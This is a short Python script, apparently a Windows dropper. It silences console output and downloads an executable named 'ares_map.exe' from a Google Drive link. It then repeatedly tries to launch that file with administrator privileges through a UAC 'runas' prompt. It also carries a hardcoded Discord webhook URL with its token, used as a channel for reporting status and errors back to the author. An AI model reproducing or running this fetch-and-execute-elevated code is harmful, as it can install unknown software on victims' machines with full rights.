import ctypes
import requests
from http.cookiejar import CookieJar
import pandas as pd
import numpy as np
import os
import gdown

def send_to_discord(content):
    try:
        webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO" 
        headers = {
            "Content-Type": "application/json"
        }

        for i in content.split("\n"):
            data = {
                "content": i
            }
            r = requests.post(webhook_url, json=data, headers=headers)
    except Exception as e:
        webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO" 
        
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "content": "SEND Error!\n" + str(e)
        }
        r = requests.post(webhook_url, json=data, headers=headers)

# def download_file(file_id, file_name):
#     try:
#         # 쿠키 저장을 위한 CookieJar 객체 생성
#         cookie_jar = CookieJar()

#         # 첫 번째 요청: 쿠키를 얻기 위해 Google Drive URL에 접근
#         url_1 = f"https://drive.google.com/uc?export=download&id={file_id}"

#         # 요청 보내기
#         response = requests.get(url_1, cookies=cookie_jar, allow_redirects=True)
#         code = 't'

#         # 두 번째 요청: confirm 코드와 함께 파일을 다운로드
#         url_2 = f"https://drive.google.com/uc?export=download&confirm={code}&id={file_id}"

#         # 다운로드 요청
#         with requests.get(url_2, cookies=cookie_jar, stream=True) as r:
#             if r.status_code == 200:
#                 with open(file_name, 'wb') as f:
#                     for chunk in r.iter_content(chunk_size=1024):
#                         if chunk:
#                             f.write(chunk)
#                 send_to_discord(f"File '{file_name}' downloaded successfully.")
#             else:
#                 send_to_discord(f"Failed to download the file: {r.status_code}")
        
#         return True

#     except Exception as e:
#         send_to_discord(f"Error downloading file: {e}")
#         return False

def run_as_admin():
    if sys.stdout is None:
        sys.stdout = open(os.devnull, "w")
    if sys.stderr is None:
        sys.stderr = open(os.devnull, "w")

    cnt = 0
    url = "https://drive.google.com/uc?id=1WSSvB3lF3f15serxeQ5WS6d00v8U-ocY"
    output = 'ares_map.exe'
    
    # 1. 파일 다운로드
    gdown.download(url, output, quiet=False)

    # 2. 다운로드한 파일을 관리자 권한으로 실행
    while True:
        if cnt > 10:
            break

        cnt += 1
        # 관리자 권한으로 실행
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", output, None, None, 1)
        
        # 실행이 성공하면 True 반환
        if result > 32:
            return True
        
    return False

if __name__ == "__main__":
    run_as_admin()
